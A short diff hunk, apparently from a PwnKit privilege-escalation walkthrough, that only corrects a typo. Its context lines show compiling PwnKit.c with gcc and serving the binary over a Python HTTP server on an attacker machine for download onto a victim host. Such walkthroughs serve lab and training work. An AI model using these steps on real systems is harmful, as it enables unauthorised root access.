@@ -92,7 +92,7 @@
       Compiling the code by 
       - gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
          ![11  1 pkexec binary](https://user-images.githubusercontent.com/75413146/153705895-3944080b-9a45-4fda-ab70-b09be5dc796c.png)
-        We got the binary compiled and now let's mode this to victim host.
+        We got the binary compiled and now let's move this to victim host.
         - 1st host a server on attacker machine we can do this by [Note : Host the server where your binary file is ! ]
           - Command : python3 -m http.server 80
         - 2nd  Go to victim terminal and download the binary by following 
